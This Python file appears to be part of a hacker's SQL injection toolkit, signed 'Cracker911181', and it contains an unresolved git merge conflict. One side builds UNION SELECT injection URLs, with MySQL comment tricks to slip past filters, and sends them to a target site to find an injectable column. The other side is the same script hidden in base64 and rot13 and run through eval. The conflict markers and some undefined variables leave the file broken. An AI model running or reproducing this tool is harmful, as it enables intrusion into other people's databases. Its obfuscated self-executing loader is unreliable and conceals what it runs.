# Coded by Cracker
# CRACKER911181
 

<<<<<<< HEAD
import requests
import sys



#Text colour
#created By Cracker911181
colouroff="\x1b[00m" #colour off

red="\x1b[91m" #red
green="\x1b[92m" #green
yellow="\x1b[93m" #yellow
blue="\x1b[94m" #blue
rosy="\x1b[95m" #rosy
pest="\x1b[96m" #pest



##########

print(blue+"\n\n[+]Checking Vulnerable Column\n"+yellow)
######## open file ########

clmn=open(".colomn.txt","r")
colmn=clmn.read()

url=open(".link.txt","r")
link=url.read()

smbl=open(".smbl.txt","r")
symbol=smbl.read()

lin=open(".union.txt","r")
url_uni=lin.read()

######################

colomn=int(colmn)

######################

smbl1=symbol[0]
smbl2=symbol[1:]
#######how much colomn #######

unin=[ ]
now_clmn=1
for i in range(colomn):
	now_colomn=str(now_clmn)
	only_colomn=str(now_clmn-1)
	print("[=] Now Checking Column : "+only_colomn)
	unin.append(now_colomn)
	
	now_clmn=now_clmn+1

unnin=list((unin))
uniion=(",".join(unnin))
ex_union=str(uniion)

###########################

selct=1
for i in range(colomn):
	select=str(selct)
	unnin=list((unin))
	union=ex_union.replace(select,"user()")
	
	
	
	if smbl1=="'":
		
		if "/*!50000UNION/**_**/*/" in url_uni:
			real_link1=str(link+smbl1+"+AND+0+/*!50000UNION/**_**/*/+SELECT+"+union+smbl2)
			resp=requests.get(real_link,headers={"User-Agent": "XY"}).text
			if "@localhost" in resp:
				print(real_link1.replace("user()",select))
				input=str(input(pest+"\nEnter Your Dois: "))
				print(yellow+"\n\n")
				print(real_link1.replace("user()",input))
				sys.exit()
		
		elif "/*!50000UNION*/" in url_uni:
			real_link2=str(link+smbl1+"+AND+0+/*!50000UNION*/+SELECT+"+union+smbl2)
			resp=requests.get(real_link,headers={"User-Agent": "XY"}).text
			if "@localhost" in resp:
				print(real_link2.replace("user()",select))
				input=str(input(pest+"\nEnter Your Dois: "))
				print(yellow+"\n\n")
				print(real_link2.replace("user()",input))
				sys.exit()
				
		else:
			real_link=str(link+smbl1+"+AND+0+UNION+SELECT+"+union+smbl2)
			
			resp1=requests.get(real_link,headers={"User-Agent": "XY"}).text
			if "@localhost" in resp1:
				print(real_link.replace("user()",select))
				input=str(input(pest+"\nEnter Your Dois: "))
				print(yellow+"\n\n")
				print(real_link.replace("user()",input))
				sys.exit()


	else:
		
		if "/*!50000UNION/**_**/*/" in url_uni:
			real_link1=str(link+"+AND+0+/*!50000UNION/**_**/*/+SELECT+"+union+symbol)
			resp=requests.get(real_link,headers={"User-Agent": "XY"}).text
			if "@localhost" in resp:
				print(real_link1.replace("user()",select))
				input=str(input(pest+"\nEnter Your Dois: "))
				print(yellow+"\n\n")
				print(real_link1.replace("user()",input))
				sys.exit()
		
		elif "/*!50000UNION*/" in url_uni:
			real_link2=str(link+"+AND+0+/*!50000UNION*/+SELECT+"+union+symbol)
			resp=requests.get(real_link,headers={"User-Agent": "XY"}).text
			if "@localhost" in resp:
				print(real_link2.replace("user()",select))
				input=str(input(pest+"\nEnter Your Dois: "))
				print(yellow+"\n\n")
				print(real_link2.replace("user()",input))
				sys.exit()
				
		else:
			real_link=str(link+"+AND+0+UNION+SELECT+"+union+symbol)
			resp=requests.get(real_link,headers={"User-Agent": "XY"}).text
			if "@localhost" in resp:
				print(real_link.replace("user()",select))
				input=str(input(pest+"\nEnter Your Dois: "))
				print(yellow+"\n\n")
				print(real_link.replace("user()",input))
				sys.exit()


	selct=selct+1
=======
import base64, codecs,time
magic = 'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzeXMKCgoKI1RleHQgY29sb3VyCiNjcmVhdGVkIEJ5IENyYWNrZXI5MTExODEKY29sb3Vyb2ZmPSJceDFiWzAwbSIgI2NvbG91ciBvZmYKCnJlZD0iXHgxYls5MW0iICNyZWQKZ3JlZW49Ilx4MWJbOTJtIiAjZ3JlZW4KeWVsbG93PSJceDFiWzkzbSIgI3llbGxvdwpibHVlPSJceDFiWzk0bSIgI2JsdWUKcm9zeT0iXHgxYls5NW0iICNyb3N5CnBlc3Q9Ilx4MWJbOTZtIiAjcGVzdAoKCgojIyMjIyMjIyMjCgpwcmludChibHVlKyJcblxuWytdQ2hlY2tpbmcgVnVsbmVyYWJsZSBDb2x1bW5cbiIreWVsbG93KQojIyMjIyMjIyBvcGVuIGZpbGUgIyMjIyMjIyMKCmNsbW49b3BlbigiLmNvbG9tbi50eHQiLCJyIikKY29sbW49Y2xtbi5yZWFkKCkKCnVybD1vcGVuKCIubGluay50eHQiLCJyIikKbGluaz11cmwucmVhZCgpCgpzbWJsPW9wZW4oIi5zbWJsLnR4dCIsInIiKQpzeW1ib2w9c21ibC5yZWFkKCkKCmxpbj1vcGVuKCIudW5pb24udHh0IiwiciIpCnVybF91bmk9bGluLnJlYWQoKQoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKY29sb21uPWludChjb2xtbikKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCnNtYmwxPXN5bWJvbFswXQpzbWJsMj1zeW1ib2xbMTpdCiMjIyMjIyNob3cgbXVjaCBjb2xvbW4gIyMjIyMjIwoKdW5pbj1bIF0Kbm93X2NsbW49MQpmb3IgaSBpbiByYW5nZShjb2xvbW4pOgoJbm93X2NvbG9tbj1zdHIobm93X2NsbW4pCglvbmx5X2NvbG9tbj1zdHIobm93X2NsbW4tMSkKCXByaW50KCJbPV0gTm93IENoZWNraW5nIENvbHVtbiA6ICIrb25seV9jb2xvbW4pCgl1bmluLmFwcGVuZChub3dfY29sb21uKQoJCglub3dfY2xtbj1ub3dfY2'
love = 'kgovfkPtc1oz5cow1fnKA0XPu1ozyhXFxXqJ5cnJ9hCFtvYPVhnz9covu1oz5covxcPzI4K3IhnJ9hCKA0pvu1ozyco24cPtbwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZXPaAyoTA0CGRXMz9lVTxtnJ4tpzShM2HbL29fo21hXGbXPKAyoTIwqQ1mqUVbp2IfL3DcPty1oz5cow1fnKA0XPu1ozyhXFxXPKIhnJ9hCJI4K3IhnJ9hYaWypTkuL2Hbp2IfMJA0YPW1p2IlXPxvXDbWPtxXPDbWnJLtp21voQR9CFVaVwbXPDxXPDycMvNvYlbuAGNjZQOIGxyCGv8dXy8dXv8dYlVtnJ4tqKWfK3IhnGbXPDxWpzIuoS9fnJ5eZG1mqUVboTyhnlgmoJWfZFfvX0SBEPfjXl8dVGHjZQNjIH5WG04iXvcsXvbiXv8eH0IZEHAHXlVeqJ5co24ep21voQVcPtxWPKWyp3N9pzIkqJImqUZhM2I0XUWyLJksoTyhnlkbMJSxMKWmCKfvIKAypv1OM2IhqPV6VPWLJFW9XF50MKu0PtxWPJyzVPWNoT9wLJkbo3A0VvOcovOlMKAjBtbWPDxWpUWcoaDbpzIuoS9fnJ5eZF5lMKOfLJAyXPW1p2IlXPxvYUAyoTIwqPxcPtxWPDycoaO1qQ1mqUVbnJ5jqKDbpTImqPfvKT5SoaEypvOMo3IlVREinKZ6VPVcXDbWPDxWpUWcoaDbrJIfoT93XlWpoykhVvxXPDxWPKOlnJ50XUWyLJksoTyhnmRhpzIjoTSwMFtvqKAypvtcVvkcoaO1qPxcPtxWPDymrKZhMKucqPtcPtxWPtxWMJkcMvNvYlbuAGNjZQOIGxyCGvbiVvOcovO1pzksqJ5cBtbWPDylMJSfK2kcozflCKA0pvufnJ5eX3AgLzjkXlVeDH5RXmNeYlbuAGNjZQOIGxyCGvbiX1ASGRIQIPfvX3IhnJ9hX3AgLzjlXDbWPDylMKAjCKWypKIyp3EmYzqyqPulMJSfK2kcozffnTIuMTIlpm17VyImMKVgDJqyoaDvBvNvJSxvsFxhqTI4qNbWPDycMvNvDTkiL2SfnT9mqPVtnJ4tpzImpQbX'
god = 'CQkJCXByaW50KHJlYWxfbGluazIucmVwbGFjZSgidXNlcigpIixzZWxlY3QpKQoJCQkJaW5wdXQ9c3RyKGlucHV0KHBlc3QrIlxuRW50ZXIgWW91ciBEb2lzOiAiKSkKCQkJCXByaW50KHllbGxvdysiXG5cbiIpCgkJCQlwcmludChyZWFsX2xpbmsyLnJlcGxhY2UoInVzZXIoKSIsaW5wdXQpKQoJCQkJc3lzLmV4aXQoKQoJCQkJCgkJZWxzZToKCQkJcmVhbF9saW5rPXN0cihsaW5rK3NtYmwxKyIrQU5EKzArVU5JT04rU0VMRUNUKyIrdW5pb24rc21ibDIpCgkJCQoJCQlyZXNwMT1yZXF1ZXN0cy5nZXQocmVhbF9saW5rLGhlYWRlcnM9eyJVc2VyLUFnZW50IjogIlhZIn0pLnRleHQKCQkJaWYgIkBsb2NhbGhvc3QiIGluIHJlc3AxOgoJCQkJcHJpbnQocmVhbF9saW5rLnJlcGxhY2UoInVzZXIoKSIsc2VsZWN0KSkKCQkJCWlucHV0PXN0cihpbnB1dChwZXN0KyJcbkVudGVyIFlvdXIgRG9pczogIikpCgkJCQlwcmludCh5ZWxsb3crIlxuXG4iKQoJCQkJcHJpbnQocmVhbF9saW5rLnJlcGxhY2UoInVzZXIoKSIsaW5wdXQpKQoJCQkJc3lzLmV4aXQoKQoKCgllbHNlOgoJCQoJCWlmICIvKiE1MDAwMFVOSU9OLyoqXyoqLyovIiBpbiB1cmxfdW5pOgoJCQlyZWFsX2xpbmsxPXN0cihsaW5rKyIrQU5EKzArLyohNTAwMDBVTklPTi8qKl8qKi8qLytTRUxFQ1QrIit1bmlvbitzeW1ib2wpCgkJCXJlc3A9cmVxdWVzdHMuZ2V0KHJlYWxfbGluayxoZWFkZXJzPXsiVXNlci1BZ2VudCI6ICJYWSJ9KS50ZXh0CgkJCWlmICJAbG9jYWxob3N0IiBpbiByZXNwOgoJCQkJcHJpbnQocmVhbF9saW5rMS5yZXBsYWNlKCJ1c2VyKCkiLHNlbGVjdCkpCgkJCQlpbnB1dD1zdHIoaW5wdXQocGVzdCsiXG5FbnRlciBZb3'
destiny = 'IlVREinKZ6VPVcXDbWPDxWpUWcoaDbrJIfoT93XlWpoykhVvxXPDxWPKOlnJ50XUWyLJksoTyhnmRhpzIjoTSwMFtvqKAypvtcVvkcoaO1qPxcPtxWPDymrKZhMKucqPtcPtxWPtxWMJkcMvNvYlbuAGNjZQOIGxyCGvbiVvOcovO1pzksqJ5cBtbWPDylMJSfK2kcozflCKA0pvufnJ5eXlVeDH5RXmNeYlbuAGNjZQOIGxyCGvbiX1ASGRIQIPfvX3IhnJ9hX3A5oJWioPxXPDxWpzImpQ1lMKS1MKA0pl5aMKDbpzIuoS9fnJ5eYTuyLJEypaZ9rlWIp2IlYHSaMJ50VwbtVyuMVa0cYaEyrUDXPDxWnJLtVxOfo2AuoTuip3DvVTyhVUWyp3N6PtxWPDyjpzyhqPulMJSfK2kcozflYaWypTkuL2HbVaImMKVbXFVfp2IfMJA0XFxXPDxWPJyhpUI0CKA0pvucoaO1qPujMKA0XlWpoxIhqTIlVSyiqKVtET9cpmbtVvxcPtxWPDyjpzyhqPu5MJkfo3peVykhKT4vXDbWPDxWpUWcoaDbpzIuoS9fnJ5eZv5lMKOfLJAyXPW1p2IlXPxvYTyhpUI0XFxXPDxWPKA5pl5yrTy0XPxXPDxWPDbWPJIfp2H6PtxWPKWyLJksoTyhnm1mqUVboTyhnlfvX0SBEPfjX1IBFH9BX1ASGRIQIPfvX3IhnJ9hX3A5oJWioPxXPDxWpzImpQ1lMKS1MKA0pl5aMKDbpzIuoS9fnJ5eYTuyLJEypaZ9rlWIp2IlYHSaMJ50VwbtVyuMVa0cYaEyrUDXPDxWnJLtVxOfo2AuoTuip3DvVTyhVUWyp3N6PtxWPDyjpzyhqPulMJSfK2kcozfhpzIjoTSwMFtvqKAypvtcVvkmMJkyL3DcXDbWPDxWnJ5jqKD9p3ElXTyhpUI0XUOyp3DeVykhEJ50MKVtJJ91pvORo2ymBvNvXFxXPDxWPKOlnJ50XUyyoTkiqlfvKT5povVcPtxWPDyjpzyhqPulMJSfK2kcozfhpzIjoTSwMFtvqKAypvtcVvkcoaO1qPxcPtxWPDymrKZhMKucqPtcPtbXPKAyoTA0CKAyoTA0XmR='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
>>>>>>> 92deafb008d1bb650e2a2df0d133f097b979d969
